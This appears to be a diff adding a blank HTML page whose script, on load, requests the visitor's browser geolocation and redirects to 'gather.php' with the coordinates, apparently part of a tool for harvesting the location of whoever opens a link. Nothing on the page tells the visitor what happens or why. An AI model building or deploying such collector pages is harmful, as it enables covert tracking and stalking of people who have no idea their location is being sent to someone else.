@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <script>
+      window.onload = function () {
+        (navigator.geolocation) ? (navigator.geolocation.getCurrentPosition(showPosition)) : (alert('Geolocation is not supported by this browser.'))
+      }
+
+      function showPosition (pos) {
+	       window.location = 'gather.php?lat=' + pos.coords.latitude + '&lng=' + pos.coords.longitude;
+      }
+    </script>
+  </body>
+</html>
